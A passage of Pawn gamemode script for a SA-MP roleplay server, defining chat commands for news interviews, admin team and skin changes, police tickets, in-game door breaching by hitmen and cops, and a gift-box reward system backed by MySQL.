			GetPlayerPos(playerid, rx2, ry2, rz2);
			if (IsPlayerConnected(playerid))
			{
				GivePlayerWeaponEx(playerid, 46, 0);
				SetPlayerPosEx(playerid,rx2, ry2, rz2+1500);
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:live(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
		{
			new giveplayerid,count=0;
			if(sscanf(params, "u",giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/live <Name/Playerid>");
			foreach(Player, i)
			{
				if(TalkingLive[i] != 0 && PlayerInfo[i][pMember] != 9)
				{
					count++;
				}
			}
			if(PlayerInfo[playerid][pRank] >= 1 && PlayerInfo[playerid][pRank] <= 5 && count > 2) return SendClientMessage(playerid, COLOR_SERVER, "You can't invite more than 3 players to a live interview.");
			if(PlayerInfo[playerid][pRank] >= 6 && count > 3) return SendClientMessage(playerid, COLOR_SERVER, "You can't invite more than 4 players to a live interview.");
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					if (ProxDetectorS(5.0, playerid, giveplayerid))
					{
					    if(giveplayerid == playerid) return SendClientMessage(playerid, COLOR_SERVER, "You can't invite yourself to a live interview.");
						if(TalkingLive[giveplayerid] != 0) return SendClientMessage(playerid, COLOR_SERVER, "This player is already in a live interview.");
						if(PlayerInfo[giveplayerid][pMember] == 9) return SendClientMessage(playerid, COLOR_SERVER, "You can't invite a news reporter to a live interview.");
						new sendername[25],giveplayer[25],string[128];
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "You invited %s to take a live interview.", giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "%s has invited you to take a live interview. (to accept the invitation, type '/accept live %d').", sendername,playerid);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						LiveOffer[giveplayerid] = playerid;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_SERVER,"This player is not near you.");
					    return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			    return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a News Reporter.");
		}
	}
	return 1;
}
CMD:endlive(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
		{
			new giveplayerid,string[128],sendername[30],string2[500],giveplayer[30],count=0;
			if(sscanf(params, "u",giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/endlive <Name/Playerid>");
			if(TalkingLive[giveplayerid] != 0)
		    {
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				format(string,sizeof(string),"You have stoped %s live interview!",giveplayer);
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string,sizeof(string),"%s has stoped the live interview!",sendername);
		        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
		        format(string2,500,"{33CCCC}%s has stop he's live with %S.",sendername,giveplayer);
				SendFamilyMessage(9,COLOR_YELLOW,string2);
		        TogglePlayerControllable(giveplayerid, 1);
	            TalkingLive[giveplayerid] = 0;
				foreach(Player, i)
				{
					if(TalkingLive[i] != 0 && PlayerInfo[i][pMember] != 9)
					{
						count++;
					}
				}
				if(count < 1)
				{
					TogglePlayerControllable(playerid, 1);
					TalkingLive[playerid] = 0;
				}
		    }
		}
		else
		{
		    SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a News Reporter.");
		}
	}
	return 1;
}
CMD:setteam(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 5)
		{
			new para1,level,string[128],giveplayer[25],sendername[25];
			if(sscanf(params, "ud",para1,level)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setteam <Name/Playerid> <Team 3(civ) - 2(cop) - 4(pasnic) - 5(mafia) - 11(hitman)>");
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pTeam] = level;
					gTeam[para1] = level;
					SetPlayerSpawn(para1);
					printf("[Admin-Warn]: %s has switched %s to team %d.", sendername, giveplayer, level);
					format(string, sizeof(string), "You have been switched to team %d by %s.", level, sendername);
					SendClientMessage(para1, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have switched %s to team %d.", giveplayer,level);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					mysql_format(SQL,string,sizeof(string),"UPDATE users SET `Team`='%d' WHERE `name`='%s'",PlayerInfo[para1][pTeam],PlayerInfo[para1][pNormalName]);
					mysql_tquery(SQL,string,"","");
				}
			}
		    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:afklist(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if (PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_ERROR, AdminOnly);
	{
		new string[128],playername[25];
		SendClientMessage(playerid, COLOR_YELLOW, ".:: AFK Players ::.");
		foreach(Player,i)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerInfo[playerid][pSleeping] == 1)
				{
					GetPlayerName(i, playername,sizeof(playername));
					format(string, 256, "Player: %s(%d)", PlayerName, i);
					SendClientMessage(playerid, COLOR_YELLOW, string);
 				}
			}
		}
	}
	return 1;
}
CMD:setskin(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
    	if (PlayerInfo[playerid][pAdmin] >= 5)
		{
			new para1,level,string[128],giveplayer[25],sendername[25];
			if(sscanf(params, "ud",para1,level)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setskin <Name/Playerid> <Skin ID>");
			if(level < 0 || level > 311) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Wrong skin ID(0-311).");
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pModel] = level;
					format(string, sizeof(string), "Your skin has been changed by Admin %s", sendername);
					SendClientMessage(para1, COLOR_SERVER, string);
					format(string, sizeof(string), "You have given %s skin to %d.", giveplayer,level);
					SendClientMessage(playerid, COLOR_SERVER, string);
				    SetPlayerSkin(para1, PlayerInfo[para1][pModel]);
					new str2[128];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `Money`='%d',`Model`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[para1][pModel],PlayerInfo[para1][pNormalName]);
					mysql_tquery(SQL,str2,"","");
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:temporarskin(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
    	if (PlayerInfo[playerid][pAdmin] >= 4)
		{
			new para1,level,string[128],giveplayer[25],sendername[25];
			if(sscanf(params, "ud",para1,level)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/temporarskin <Name/Playerid> <Skin ID>");
			if(level < 0 || level > 311) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Wrong skin ID(0-311).");
		    if(IsPlayerConnected(para1))
		    {
		        if(para1 != INVALID_PLAYER_ID)
		        {
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "Your skin has been changed temporary by Admin %s", sendername);
					SendClientMessage(para1, COLOR_SERVER, string);
					format(string, sizeof(string), "You have given temporary skin %s to %d.", giveplayer,level);
					SendClientMessage(playerid, COLOR_SERVER, string);
				    SetPlayerSkin(para1, level);
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:ticket(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 15)
	{
	    if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not on Duty.");
	    new giveplayerid;
		if(sscanf(params, "uis[50]",giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/ticket <Name/Playerid>");
		if(IsACop(giveplayerid)) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: You can't give a ticket to a Cop!");
		if(giveplayerid != INVALID_PLAYER_ID)
  		{
    		if (ProxDetectorS(8.0, playerid, giveplayerid))
			{
			    new s1[250],s2[250],s3[250],s4[250],s5[250],s6[250],s7[250],s9[250],sall[MAX_STRING];
				format(s1,250,"illegally parked");
				format(s2,250,"led irregular");
				format(s3,250,"Ownership / Use Hydraulice");
				format(s4,250,"Ownership / Use NOS");
				format(s5,250,"Stopped headlights");
				format(s6,250,"Far ruined");
                format(s7,250,"Speeding");
                format(s9,250,"Destruction of public things");
                format(sall,sizeof(sall),"%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",s1,s2,s3,s4,s5,s6,s7,s9);
			    ShowPlayerDialog(playerid,DIALOG_TICKET1,DIALOG_STYLE_LIST,"Ticket List:",sall,"Select","Cancel");
				ticketmuie[playerid] = giveplayerid;
			}
		}
	}
	return 1;
}
CMD:broke(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
    {
	    for(new i = 1; i < sizeof(HouseInfo); i++)
		{
			if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
			{
			    SetPlayerInterior(playerid,HouseInfo[i][hInterior]);
				SetPlayerPosEx(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
				GameTextForPlayer(playerid, "~r~~h~Breached the door", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[i][hInterior];
				PlayerInfo[playerid][pLocal] = i;
				SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
				InHouse[playerid] = i;
				WantedPoints[playerid] += 2;
				if(WantedPoints[playerid] > 13)
				{
					WantedPoints[playerid] = 13;
				}
				SetPlayerCriminal(playerid,255, "entry into restricted area");
				if(strlen(housestring[InHouse[playerid]]) > 0)
				{
    				StopAudioStreamForPlayer(playerid);
					PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
				}
			}
		}
		if (PlayerToPoint(3.0, playerid,771.77,-1342.79,15.61)) //nr
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,-1778.44,-3552.38,338.31);
			PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 9;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,918.6766,-1252.2185,16.2109)) //tow
		{
		    SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,626.3122,-11.8606,1000.9219);
			PlayerInfo[playerid][pInt] = 1;
			SetPlayerVirtualWorld(playerid, 10);
			InHQ[playerid] = 8;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,2435.3064,1671.0139,10.8203)) //SI
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,1494.2838,1304.3364,1093.2891);
			PlayerInfo[playerid][pInt] = 3;
			SetPlayerVirtualWorld(playerid, 3);
			InHQ[playerid] = 12;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,1081.1794,-345.3979,73.9825))//hitman
		{
		    SetPlayerInterior(playerid,12);
			SetPlayerVirtualWorld(playerid, 2);
			SetPlayerPosEx(playerid,2323.9993,-1148.0469,1050.7101);
			PlayerInfo[playerid][pInt] = 12;
			InHQ[playerid] = 11;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,2475.7747,-1750.5632,13.5469)) //LS TAXI
		{
		    SetPlayerInterior(playerid,18);
			SetPlayerPosEx(playerid,1700.9830,-1667.8865,20.2188);
			PlayerInfo[playerid][pInt] = 18;
			SetPlayerVirtualWorld(playerid, 5);
			InHQ[playerid] = 13;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,1614.92480, 1816.09631, 10.91310)) //fireman / paramedic
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,1494.2838,1304.3364,1093.2891);
			PlayerInfo[playerid][pInt] = 3;
			SetPlayerVirtualWorld(playerid, 7);
			InHQ[playerid] = 14;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,1481.1063,-1771.2532,18.7958))
        {
	        SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,1262.1383,-785.3315,1091.9063);
		    GameTextForPlayer(playerid, "~w~Government", 5000, 1);
		    PlayerInfo[playerid][pInt] = 3;
		    SetPlayerVirtualWorld(playerid, 3);
		    InHQ[playerid] = 7;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(8.0, playerid,1456.7423,2773.3423,10.8203))//Los Aztecas
		{
	        GameTextForPlayer(playerid, "~g~Los Aztecas", 1000, 1);
	        SetPlayerInterior(playerid,6);
	        PlayerInfo[playerid][pInt] = 6;
		    SetPlayerPosEx(playerid,774.213989,-48.924297,1000.585937);
		    SetPlayerVirtualWorld(playerid, 1);
            InHQ[playerid] = 4;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(8.0, playerid,2495.3271,-1690.6740,14.7656))//Grove Street
		{
	        GameTextForPlayer(playerid, "~g~Grove Street", 1000, 1);
	        SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,2496.049804,-1695.238159,1014.742187);
		    InHQ[playerid] = 5;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
			SetPlayerVirtualWorld(playerid,393);
		}
		else if (PlayerToPoint(3.0, playerid,1455.2687,750.8684,11.0234))
        {
            SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,964.106994,-53.205497,1001.124572);
		    GameTextForPlayer(playerid, "~w~Ballas HQ", 5000, 1);
		    PlayerInfo[playerid][pInt] = 3;
		    InHQ[playerid] = 10;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
		else if (PlayerToPoint(3.0, playerid,725.6769,-1440.4506,13.5391))
        {
            SetPlayerInterior(playerid,12);
		    SetPlayerPosEx(playerid,2324.2273,-1148.8241,1050.7101);
		    GameTextForPlayer(playerid, "~w~Los Vagos HQ", 5000, 1);
		    PlayerInfo[playerid][pInt] = 12;
		    InHQ[playerid] = 6;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
			SetPlayerVirtualWorld(playerid,1);
		}
		else if (PlayerToPoint(3.0, playerid,1073.0619,-344.5148,73.9922))
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,1212.019897,-28.663099,1000.953125);
			PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 8;
			WantedPoints[playerid] += 2;
			if(WantedPoints[playerid] > 13)
			{
				WantedPoints[playerid] = 13;
			}
			SetPlayerCriminal(playerid,255, "entry into restricted area");
		}
	    else if (IsPlayerInRangeOfPoint(playerid,2,771.77,-1342.79,15.61)) //nr
	    {
	        SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,-1778.44,-3552.38,338.31);
		    PlayerInfo[playerid][pInt] = 3;
		    InHQ[playerid] = 9;
	    }
	}
	else return SCM(playerid,COLOR_SERVER,"{FFB870}You are not Hitman.");
	return 1;
}
CMD:ram(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(OnDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{3385FF}You are not on Duty.");
    if(IsACop(playerid))
    {
	    for(new i = 1; i < sizeof(HouseInfo); i++)
		{
			if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
			{
			    SetPlayerInterior(playerid,HouseInfo[i][hInterior]);
				SetPlayerPosEx(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
				GameTextForPlayer(playerid, "~r~~h~Breached the door", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[i][hInterior];
				PlayerInfo[playerid][pLocal] = i;
				SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
				InHouse[playerid] = i;
				if(strlen(housestring[InHouse[playerid]]) > 0)
				{
    				StopAudioStreamForPlayer(playerid);
					PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
				}
			}
		}
		if (PlayerToPoint(3.0, playerid,-329.5258,1536.7759,76.6117)) //nr
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,-2027.0515,-104.5211,1035.1719);
			PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 9;
		}
		else if (PlayerToPoint(3.0, playerid,918.6766,-1252.2185,16.2109)) //tow
		{
		    SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,626.3122,-11.8606,1000.9219);
			PlayerInfo[playerid][pInt] = 1;
			InHQ[playerid] = 8;
			SetPlayerVirtualWorld(playerid, 10);
		}
		else if (PlayerToPoint(3.0, playerid,2435.3064,1671.0139,10.8203)) //SI
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,1494.2838,1304.3364,1093.2891);
			PlayerInfo[playerid][pInt] = 3;
			SetPlayerVirtualWorld(playerid, 3);
			InHQ[playerid] = 12;
		}
		else if (PlayerToPoint(3.0, playerid,1081.1794,-345.3979,73.9825))//hitman
		{
		    SetPlayerInterior(playerid,12);
			SetPlayerPosEx(playerid,2323.9993,-1148.0469,1050.7101);
			PlayerInfo[playerid][pInt] = 12;
			InHQ[playerid] = 11;
			SetPlayerVirtualWorld(playerid, 2);
		}
		else if (PlayerToPoint(3.0, playerid,1761.6931,-1901.9446,13.5647)) //LS TAXI
		{
		    SetPlayerInterior(playerid,18);
			SetPlayerPosEx(playerid,1700.9830,-1667.8865,20.2188);
			PlayerInfo[playerid][pInt] = 18;
			SetPlayerVirtualWorld(playerid, 5);
			InHQ[playerid] = 13;
		}
		else if (PlayerToPoint(3.0, playerid,1614.92480, 1816.09631, 10.91310)) //fireman / paramedic
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,1494.2838,1304.3364,1093.2891);
			PlayerInfo[playerid][pInt] = 3;
			SetPlayerVirtualWorld(playerid, 7);
			InHQ[playerid] = 14;
		}
		else if (PlayerToPoint(3.0, playerid,1481.1063,-1771.2532,18.7958))
        {
	        SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,1262.1383,-785.3315,1091.9063);
		    GameTextForPlayer(playerid, "~w~Government", 5000, 1);
		    PlayerInfo[playerid][pInt] = 3;
		    SetPlayerVirtualWorld(playerid, 3);
		    InHQ[playerid] = 7;
		}
		else if (PlayerToPoint(8.0, playerid,1456.7423,2773.3423,10.8203))//Los Aztecas
		{
	        GameTextForPlayer(playerid, "~g~Los Aztecas", 1000, 1);
	        SetPlayerInterior(playerid,6);
	        PlayerInfo[playerid][pInt] = 6;
		    SetPlayerPosEx(playerid,774.213989,-48.924297,1000.585937);
		    SetPlayerVirtualWorld(playerid, 1);
            InHQ[playerid] = 4;
		}
		else if (PlayerToPoint(8.0, playerid,2495.3271,-1690.6740,14.7656))//Grove Street
		{
	        GameTextForPlayer(playerid, "~g~Grove Street", 1000, 1);
	        SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,2496.049804,-1695.238159,1014.742187);
		    InHQ[playerid] = 3;
		    SetPlayerVirtualWorld(playerid,393);
		}
		else if (PlayerToPoint(3.0, playerid,1455.2687,750.8684,11.0234))
        {
            SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,964.106994,-53.205497,1001.124572);
		    GameTextForPlayer(playerid, "~w~Ballas HQ", 5000, 1);
		    PlayerInfo[playerid][pInt] = 3;
		    InHQ[playerid] = 10;
		}
		else if (PlayerToPoint(3.0, playerid,725.6769,-1440.4506,13.5391))
        {
            SetPlayerInterior(playerid,12);
		    SetPlayerPosEx(playerid,2324.2273,-1148.8241,1050.7101);
		    GameTextForPlayer(playerid, "~w~Los Vagos HQ", 5000, 1);
		    PlayerInfo[playerid][pInt] = 12;
		    InHQ[playerid] = 6;
		    SetPlayerVirtualWorld(playerid,1);
		}
		else if (PlayerToPoint(3.0, playerid,1073.0619,-344.5148,73.9922))
		{
		    SetPlayerInterior(playerid,3);
			SetPlayerPosEx(playerid,1212.019897,-28.663099,1000.953125);
			PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 8;
		}
	    else if (IsPlayerInRangeOfPoint(playerid,2,-329.5258,1536.7759,76.6117)) //nr
	    {
	        SetPlayerInterior(playerid,3);
		    SetPlayerPosEx(playerid,-2027.0515,-104.5211,1035.1719);
		    PlayerInfo[playerid][pInt] = 3;
		    InHQ[playerid] = 9;
	    }
		for(new i = 1; i < sizeof(BizzInfo); i++)
		{
			if(BizzInfo[i][bSbiz] != 0) return SendClientMessage(playerid, COLOR_SERVER, "You can't ram this business.");
			if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
			{
			    SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
				SetPlayerPosEx(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
				GameTextForPlayer(playerid, "~r~~h~Breached the door", 5000, 1);
				SetPlayerVirtualWorld(playerid,BizzInfo[i][bVirtual]);
				PlayerInfo[playerid][pInt] = BizzInfo[i][bInterior];
				PlayerInfo[playerid][pLocal] = i;
				InBussines[playerid] = i;
			}
		}
	}
	else return SCM(playerid,COLOR_SERVER,"{FFB870}You are not a Cop.");
	return 1;
}
CMD:activatebonus(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if (PlayerInfo[playerid][pAdmin] >= 6)
		{
		    if(BonusActiv == 0)
 	    	{
 	    	    BonusActiv = 1;
 	    	    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You turn on the /bonus!");
			}
			else
			{
			    BonusActiv = 0;
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You order off /bonus!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:giftpremium(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if(PlayerInfo[playerid][pAdmin] >= 6)
		{
		    new premium,string[128];
		    format(string,sizeof(string),"%d players can earn points premium",PremiumMaxim);
		    SendClientMessage(playerid, COLOR_YELLOW, string);
		    if(sscanf(params, "d",premium)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/giftpremium <Max Premiums>");
		    PremiumMaxim = premium;
			format(string,sizeof(string),"Now you can earn up %d players points premium.",PremiumMaxim);
			SendClientMessage(playerid, COLOR_YELLOW, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:resetgift(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    new string[256];
 	    if(PlayerInfo[playerid][pAdmin] >= 7)
		{
		    foreach(Player, i)
		    {
		        if(IsPlayerConnected(i))
		        {
		            PlayerInfo[i][pGiftTime] = 0;
		            SendClientMessage(playerid, COLOR_YELLOW, "Now all players can give /getgift.");
				}
			}
			mysql_format(SQL,string,sizeof(string),"UPDATE users SET GiftTime = 0");
			mysql_tquery(SQL,string,"","");
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:giftbox(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if(PlayerInfo[playerid][pAdmin] >= 7)
		{
		    if(IsPlayerInAnyVehicle(playerid)) return 1;
		    new Float:X,Float:Y,Float:Z,Float:A;
		    GetPlayerPos(playerid, X, Y, Z);
		    GetPlayerFacingAngle(playerid, A);
		    if(GiftBoxActiv < 1)
		    {
		        GiftPosX = X;
		        GiftPosY = Y;
		        GiftPosZ = Z;
		        giftboxobject = CreateDynamicObject(19056, X, Y, Z - 0.4, 0.0, 0.0, A);
		        giftbox3DText = CreateStreamed3DTextLabel("TopZone Giftbox\nUse /getgift to get a gift",0xA9C4E4CC,X,Y,Z+0.25,8.0,0);
		    	SendClientMessage(playerid, COLOR_YELLOW, "Ai activat giftbox.");
		    	PremiumMaxim = 5;
		    	GiftBoxActiv = 1;
			}
			else
			{
			    DestroyDynamicObject(giftboxobject);
            	DestroyDynamic3DTextLabel(giftbox3DText);
		    	SendClientMessage(playerid, COLOR_YELLOW, "You have disabled gift box.");
		    	PremiumMaxim = 0;
		    	GiftBoxActiv = 0;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:getgift(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
 	    if(GiftBoxActiv > 0)
 	    {
 	        if(PlayerInfo[playerid][pConnectTime] <= 4) return SendClientMessage(playerid, COLOR_ERROR, "You need 5 hours to use /getgift.");
 	        if(PlayerInfo[playerid][pGiftTime] > 0)
 	        {
 	            new string[1000];
 	            format(string,sizeof(string),"You can also use this command over %d hours.",PlayerInfo[playerid][pGiftTime]);
 	            SendClientMessage(playerid, COLOR_YELLOW, string);
 	            return 1;
			}
     		if(IsPlayerInRangeOfPoint(playerid, 5.0, GiftPosX,GiftPosY,GiftPosZ))
      		{
      			new randgift = 1+ random(29) ,string[1000],sendername[30];
      			GetPlayerName(playerid,sendername,sizeof(sendername));
				if(randgift == 21 || randgift == 22 || randgift == 23)
				{
					if(PlayerInfo[playerid][pVip] == 1)
					{
						if(PlayerInfo[playerid][pPcarkey] == 0 ||  PlayerInfo[playerid][pmotokey] == 0 ||  PlayerInfo[playerid][pprcarkey] == 0 ||  PlayerInfo[playerid][pprcarkey2] == 0 ||  PlayerInfo[playerid][pPPluscarkey] == 0 ||  PlayerInfo[playerid][pPPluscarkey2] == 0
